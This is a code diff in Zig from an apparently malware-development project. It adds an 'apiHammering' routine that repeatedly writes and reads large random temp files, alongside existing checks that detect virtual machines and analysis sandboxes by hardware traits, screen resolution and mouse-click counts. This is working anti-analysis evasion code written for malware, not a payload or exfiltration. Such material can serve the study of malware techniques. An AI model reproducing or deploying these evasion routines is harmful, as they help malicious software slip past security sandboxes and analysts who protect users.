@@ -9,6 +9,9 @@ const WM_LBUTTONDOWN = win.WM_LBUTTONDOWN;
 const WM_RBUTTONDOWN = win.WM_RBUTTONDOWN;
 const WM_MBUTTONDOWN = win.WM_MBUTTONDOWN;
 const WAIT_FAILED = win.WAIT_FAILED;
+const FILE_GENERIC_WRITE = win.FILE_GENERIC_WRITE;
+const FILE_GENERIC_READ = win.FILE_GENERIC_READ;
+const INVALID_HANDLE_VALUE = win.INVALID_HANDLE_VALUE;
 
 const SYSTEM_INFO = win.SYSTEM_INFO;
 const MEMORYSTATUSEX = win.MEMORYSTATUSEX;
@@ -42,6 +45,10 @@ const CreateThread = win.CreateThread;
 const CreateEventA = win.CreateEventA;
 const GetTickCount64 = win.GetTickCount64;
 const CloseHandle = win.CloseHandle;
+const GetTempPathA = win.GetTempPathA;
+const CreateFileA = win.CreateFileA;
+const WriteFile = win.WriteFile;
+const ReadFile = win.ReadFile;
 
 pub fn isVenvByHardwareCheck() !bool {
     var system_info: SYSTEM_INFO = undefined;
@@ -114,12 +121,7 @@ pub fn isVenvByHardwareCheck() !bool {
     return cpu_check or ram_check or usb_check;
 }
 
-fn resolutionCallback(
-    h_monitor: ?HMONITOR,
-    _: ?HDC,
-    _: ?*RECT,
-    data: usize,
-) callconv(std.os.windows.WINAPI) BOOL {
+fn resolutionCallback(h_monitor: ?HMONITOR, _: ?HDC, _: ?*RECT, data: usize) callconv(std.os.windows.WINAPI) BOOL {
     var monitor_info = std.mem.zeroes(MONITORINFO);
     monitor_info.cbSize = @sizeOf(MONITORINFO);
 
@@ -240,4 +242,64 @@ pub fn checkUserInteraction() !bool {
 
     std.debug.print("[!] Monitored User's Mouse Clicks: {d}\n", .{mouse_clicks});
     return mouse_clicks <= 5;
+}
+
+pub fn apiHammering(allocator: std.mem.Allocator, stress: usize) !void {
+    var tmp_path_buf: [MAX_PATH:0]u8 = undefined;
+    const tmp_path_len = GetTempPathA(MAX_PATH, &tmp_path_buf);
+    if (tmp_path_len == 0) {
+        std.debug.print("[!] GetTempPathA Failed With Error: {s}\n", .{@tagName(GetLastError())});
+        return error.GetTempPathAFailed;
+    }
+    const tmp_path = tmp_path_buf[0..tmp_path_len];
+
+    const path = try std.fs.path.joinZ(allocator, &.{ tmp_path, "maldev.tmp" });
+    defer allocator.free(path);
+
+    for (0..stress) |_| {
+        var h_file = CreateFileA(
+            path,
+            FILE_GENERIC_WRITE,
+            .{},
+            null,
+            .CREATE_ALWAYS,
+            .{ .FILE_ATTRIBUTE_TEMPORARY = 1 },
+            null,
+        );
+        if (h_file == INVALID_HANDLE_VALUE) {
+            std.debug.print("[!] CreateFileA Failed With Error: {s}\n", .{@tagName(GetLastError())});
+            return error.CreateFileAFailed;
+        }
+
+        var rand_buf: [0xfffff]u8 = undefined;
+        std.crypto.random.bytes(&rand_buf);
+
+        var number_of_bytes_written: u32 = 0;
+        if (WriteFile(h_file, &rand_buf, rand_buf.len, &number_of_bytes_written, null) == 0 or number_of_bytes_written != rand_buf.len) {
+            std.debug.print("[!] WriteFile Failed With Error: {s}\n", .{@tagName(GetLastError())});
+            return error.WriteFileFailed;
+        }
+        _ = CloseHandle(h_file);
+
+        h_file = CreateFileA(
+            path,
+            FILE_GENERIC_READ,
+            .{},
+            null,
+            .OPEN_EXISTING,
+            .{ .FILE_ATTRIBUTE_TEMPORARY = 1, .FILE_FLAG_DELETE_ON_CLOSE = 1 },
+            null,
+        );
+        if (h_file == INVALID_HANDLE_VALUE) {
+            std.debug.print("[!] CreateFileA Failed With Error: {s}\n", .{@tagName(GetLastError())});
+            return error.CreateFileAFailed;
+        }
+
+        var number_of_bytes_read: u32 = 0;
+        if (ReadFile(h_file, &rand_buf, rand_buf.len, &number_of_bytes_read, null) == 0 or number_of_bytes_read != rand_buf.len) {
+            std.debug.print("[!] ReadFile Failed With Error: {s}\n", .{@tagName(GetLastError())});
+            return error.ReadFileFailed;
+        }
+        _ = CloseHandle(h_file);
+    }
 }
